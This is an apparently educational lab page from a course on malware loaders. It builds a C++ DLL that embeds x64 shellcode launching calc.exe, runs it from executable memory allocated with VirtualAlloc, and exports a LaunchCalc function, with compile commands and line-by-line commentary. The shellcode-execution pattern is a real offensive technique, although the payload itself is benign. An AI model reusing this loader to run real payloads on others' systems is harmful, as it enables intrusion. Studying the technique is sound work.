---
showTableOfContents: true
title: "Create a Basic DLL (Lab 1.1)"
type: "page"
---
## Goal
In this lab we'll create a simple Dynamic Link Library (DLL) in C++. 
The DLL will export a single function called `LaunchCalc()`. 
When called, this function will execute a small piece of embedded shellcode designed to launch the Windows Calculator (`calc.exe`). 
This exercise provides a practical foundation by creating the basic payload we will work with in subsequent labs.

## Code
Note that I also provide the code with a hefty helping of explanatory comments at the bottom.

```c++
#include <windows.h>

unsigned char calc_shellcode[] = {
    0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63,
    0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48,
    0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24,
    0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45,
    0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7,
    0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3
};

BOOL ExecuteShellcode() {
    void* exec_memory = VirtualAlloc(NULL, sizeof(calc_shellcode),
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE);

    if (exec_memory == NULL) {
        return FALSE;
    }

    RtlCopyMemory(exec_memory, calc_shellcode, sizeof(calc_shellcode));

    void (*shellcode_func)() = (void(*)())exec_memory;

    shellcode_func();

    VirtualFree(exec_memory, 0, MEM_RELEASE);
    return TRUE;
}

extern "C" {
    __declspec(dllexport) BOOL LaunchCalc() {
        return ExecuteShellcode();
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

## Code Breakdown

**`#include <windows.h>`:**
- Includes necessary definitions for Windows API functions like `VirtualAlloc`, `RtlCopyMemory`, `VirtualFree`, and types like `BOOL`, `DWORD`, `HINSTANCE`, `LPVOID`.

**`calc_shellcode[]`:**
- The byte array that holds the pre-compiled machine code instructions (for x64 architecture) that will ultimately call the Windows API functions needed to launch `calc.exe`. 
- Note that creating shellcode is beyond the scope of this course, it's a technically challenging topic that requires an understanding of assembly. Good news is that I am also working on a free course on this topic which will be completed somewhere in 2025. In the meantime we'll use this reliable source for this course.

**`ExecuteShellcode()`:**
- This function contains the logic for executing the raw shellcode bytes. It allocates a block of memory marked as readable, writable, and executable (`PAGE_EXECUTE_READWRITE`) (1). It then copies the shellcode bytes into this memory (2) and executes them by treating the memory address as a function pointer (3). Finally, it cleans up by freeing the allocated memory (4).
- I've mentioned it before, but it's worth repeating - this is an incredibly unsophisticated way to run shellcode that is 100% guaranteed to be picked up by any AV/EDR. But it forms the conceptual foundation upon which we will iterate once we have everything in place, so for now it simply doing the trick is good enough.

**`extern "C"`:**
- This block tells the C++ compiler to use C-style linkage for the function(s) inside it. This prevents [C++ "name mangling,"](https://www.emmtrix.com/wiki/Demystifying_C%2B%2B_-_Name_Mangling) ensuring our exported function retains the simple, predictable name `LaunchCalc` instead of a decorated C++ name.

**`__declspec(dllexport)`:**
- This Microsoft-specific keyword explicitly tells the compiler and linker that the following function (`LaunchCalc`) should be exported from the DLL, making it callable by external applications.

**`LaunchCalc()`:**
- This is the name we give to the function we intend to call from our loader later.
- The function does 2 things - it calls `ExecuteShellcode()` and returns its success/failure status.

**`DllMain()`:**
- This is the standard entry point function for a Windows DLL.
- The operating system calls this function when the DLL is loaded or unloaded from a process, or when threads are created/destroyed within the process - you'll notice 4 sections corresponding to these 4 events.
- While not strictly necessary for _this specific_ payload to function (as we call it directly since it has been exported), a `DllMain` is required for a well-formed DLL and is often used for initialization/cleanup. Here, it does nothing but return `TRUE`.
- Also note that we can for example call `LaunchCalc()` automatically once the Dll is loaded, but in general this is not preferred since it offers less control without a clear advantage in most contexts.


## Instructions
Use code above and save as a *.cpp file, in my case I'll save it as `calc_dll.cpp`.

We'll then need to compile our DLL, the exact application + command will differ depending on what system you are working from:

On Darwin (Mac OS):
```
x86_64-w64-mingw32-g++ calc_dll.cpp -o calc_dll.dll -shared -static-libgcc -static-libstdc++ -luser32
```

On Windows:
```
cl.exe /D_USRDLL /D_WINDLL calc_dll.cpp /link /DLL /OUT:calc_dll.dll
```

On Linux:
```
g++ -shared -o calc_dll.dll calc_dll.cpp -Wl,--out-implib,libcalc_dll.a
```

## Expected Outcome:

After the compilation command finishes without errors, you should find a new file named `calc_dll.dll` in the same directory, 
this is your compiled Dynamic Link Library. The DLL contains embedded shellcode to launch `calc.exe` and exports the 
function `LaunchCalc` to trigger this shellcode. For now we can't do much with it, but it is now ready to be used in the next lab 
where we will create a Go loader to execute it using standard Windows API calls.

___
## Code with Comments
```c++
#include <windows.h>

// Reliable x64 Windows shellcode for launching calculator
unsigned char calc_shellcode[] = {
    0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63,
    0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48,
    0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
    0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24,
    0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45,
    0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7,
    0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3
};

// Execute shellcode directly (without using a thread)
BOOL ExecuteShellcode() {
    // Allocate memory with PAGE_EXECUTE_READWRITE
    // This memory region will hold our shellcode and needs to be executable.
    void* exec_memory = VirtualAlloc(NULL, sizeof(calc_shellcode),
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE);

    if (exec_memory == NULL) {
        // Allocation failed, return FALSE to indicate failure.
        return FALSE;
    }

    // Copy shellcode bytes from our array into the executable memory region.
    // RtlCopyMemory is often used as it can be less likely to be hooked than memcpy.
    RtlCopyMemory(exec_memory, calc_shellcode, sizeof(calc_shellcode));

    // Create a function pointer that points to the beginning of our shellcode
    // in the executable memory region.
    void (*shellcode_func)() = (void(*)())exec_memory;

    // Execute the shellcode by calling the function pointer.
    // This transfers CPU execution to the instructions in exec_memory.
    shellcode_func();

    // Free the allocated memory once the shellcode has executed.
    VirtualFree(exec_memory, 0, MEM_RELEASE);
    return TRUE; // Indicate success
}

// Use C linkage for exported functions to prevent C++ name mangling.
// This ensures the exported function name is predictable ("LaunchCalc").
extern "C" {
    // Explicitly export the LaunchCalc function using __declspec(dllexport).
    // This makes it visible and callable from other programs that load this DLL.
    // It returns BOOL (TRUE/FALSE) to indicate success/failure.
    __declspec(dllexport) BOOL LaunchCalc() {
        return ExecuteShellcode();
    }
}

// Standard DLL entry point. Required for a valid DLL, but doesn't
// need to do anything for this simple example.
// It's called by the OS when the DLL is loaded/unloaded or threads attach/detach.
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    // Perform actions based on the reason for calling.
    // For this lab, we don't need any specific initialization or cleanup.
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Code to run when the DLL is loaded into a process
            break;
        case DLL_THREAD_ATTACH:
            // Code to run when a thread is created
            break;
        case DLL_THREAD_DETACH:
            // Code to run when a thread ends cleanly
            break;
        case DLL_PROCESS_DETACH:
            // Code to run when the DLL is unloaded from a process
            break;
    }
    return TRUE; // Successful. Returning FALSE during DLL_PROCESS_ATTACH would cause loading to fail.
}
```

---
[|TOC|]({{< ref "../moc.md" >}})
[|PREV|]({{< ref "dll_loading.md" >}})
[|NEXT|]({{< ref "create_loader.md" >}})